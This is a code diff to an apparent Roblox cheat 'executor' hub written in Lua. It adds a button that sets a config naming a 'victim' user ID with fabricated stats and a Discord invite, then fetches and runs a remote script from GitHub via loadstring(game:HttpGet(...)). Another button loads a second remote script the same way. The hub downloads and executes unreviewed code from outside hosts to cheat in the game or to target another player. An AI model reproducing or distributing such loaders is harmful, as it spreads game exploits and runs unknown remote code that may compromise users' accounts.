@@ -62,6 +62,26 @@ MainTab:CreateButton({
 MainTab:CreateSection("Executors")
 
 MainTab:CreateButton({
+   Name = "Jvke",
+   Callback = function()
+       getgenv().Config = {
+           victim = 5041464410,
+           helper = "",
+           level = 979,
+           streak = 23530,
+           elo = 92802829228922892829272,
+           keys = 0,
+           premium = true,
+           verified = false,
+           unlockall = true,
+           platform = "DESKTOP",
+           join = "discord.gg/rivalscomp"
+       }
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
+   end,
+})
+
+MainTab:CreateButton({
    Name = "z3us",
    Callback = function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
